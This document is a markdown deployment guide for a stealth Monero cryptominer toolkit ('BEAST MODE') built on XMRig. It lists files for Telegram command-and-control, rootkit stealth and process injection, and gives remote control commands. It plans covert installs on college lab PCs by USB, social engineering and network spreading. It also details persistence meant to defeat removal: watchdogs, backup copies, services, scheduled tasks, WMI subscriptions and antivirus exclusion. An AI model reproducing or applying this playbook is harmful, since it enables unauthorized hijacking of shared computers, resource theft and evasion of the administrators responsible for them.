# 🔥 BEAST MODE ULTIMATE - Complete Deployment Guide

## 📋 **PHASE 1: PREPARATION (Do This ONCE)**

### **Step 1: Verify Your Files**
Make sure your `xmrig-6.22.2` folder contains:
```
xmrig-6.22.2/
├── miner_src/
│   ├── xmrig.exe
│   ├── config.json
│   ├── WinRing0x64.sys
│   └── [other xmrig files]
├── BEAST_MODE_ULTIMATE.bat          ← Master deployment script
├── install_miner-V6-ULTIMATE.bat    ← V6 Ultimate base
├── miner_monitor.ps1                 ← Telegram monitoring
├── command_control.ps1               ← Remote C&C system
├── rootkit_defense.ps1              ← Rootkit stealth
├── beast_mode_injection.ps1         ← Process injection
├── TEST_TELEGRAM.ps1                 ← Test your Telegram
└── REMOVE_ALL_V6.bat                ← Cleanup tool (for testing)
```

### **Step 2: Test Telegram Connection (IMPORTANT!)**
Before deploying, test that your Telegram bot works:
```cmd
powershell -ExecutionPolicy Bypass -File "TEST_TELEGRAM.ps1"
```
**Expected Result:** You should receive a test message in your Telegram app.

## 📲 **PHASE 4: REMOTE CONTROL VIA TELEGRAM**

### **Available Commands:**
Send these to your Telegram bot:

```
/status beast2025       ← Get current fleet status
/restart beast2025      ← Restart all miners
/boost beast2025        ← Enable performance boost
/stealth beast2025      ← Activate stealth mode

## 🎯 **PHASE 5: DEPLOYMENT STRATEGY FOR COLLEGE LAB**

### **Stealth Deployment Plan:**

#### **Option 1: Quick Strike (5-10 minutes per PC)**
1. **Prepare USB** with BEAST MODE files
2. **Walk through lab** during class/break
3. **Plug in USB** → **Copy folder** → **Run script** → **Remove USB**
4. **Repeat** on each PC

#### **Option 2: Social Engineering**
1. **Ask to "borrow" a PC** for "testing a program"
2. **Deploy BEAST MODE** while "working"
3. **Return PC** - system running invisibly

#### **Option 3: Scheduled Deployment**
1. **Deploy** on one PC with network access
2. **Use network spreading** features (advanced)
3. **Remote deploy** to other PCs

## 🛡️ **PHASE 6: WHAT THE DEFENSE TEAM WILL FACE**

### **If They Try to Remove It:**

#### **Kill Process** → **Auto-Restart**
- 5 different watchdog systems restart miner instantly

#### **Delete Files** → **Cross-Location Restore**
- Files backed up in 5 locations, each monitors others

#### **Clean Registry** → **Service Recovery**  
- Windows services recreate registry entries

#### **Disable Services** → **Scheduled Tasks**
- 15+ scheduled tasks take over

#### **Remove Scheduled Tasks** → **WMI Events**
- WMI event subscriptions trigger restart

#### **Reboot System** → **Multiple Startup**
- Boots from registry, services, tasks simultaneously

#### **Run Antivirus** → **Rootkit Stealth**
- Files invisible, excluded from scanning

4. **Verify** miner is running: Check pool website
5. **Clean up** using `REMOVE_ALL_V6.bat`

### **Stress Test:**
1. **Kill xmrig.exe** in Task Manager
2. **Check** if it restarts (should be instant)
3. **Delete** files from one location
4. **Verify** they get restored from backups
